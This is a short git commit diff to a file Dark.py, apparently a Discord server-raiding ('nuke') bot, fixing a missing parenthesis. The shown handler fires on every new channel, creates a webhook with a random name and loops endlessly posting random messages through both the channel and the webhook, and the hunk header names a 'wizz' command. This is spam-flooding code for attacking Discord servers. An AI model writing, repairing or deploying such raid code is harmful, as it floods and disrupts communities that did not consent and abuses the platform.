4ad9750f033d95164b6433c4fcf233dbb5c563ce
ItzDarknessXD <157239947+ItzDarknessXD@users.noreply.github.com>
2024-01-21 00:26:23 +0530

    Add files via upload

--- Dark.py
+++ Dark.py
@@ -149,7 +149,7 @@ async def wizz(ctx, amount=20):
 async def on_guild_channel_create(channel):
   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))
   while True:  
-    await channel.send(random.choice(MESSAGE_CONTENTS)
+    await channel.send(random.choice(MESSAGE_CONTENTS))
     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
 
 
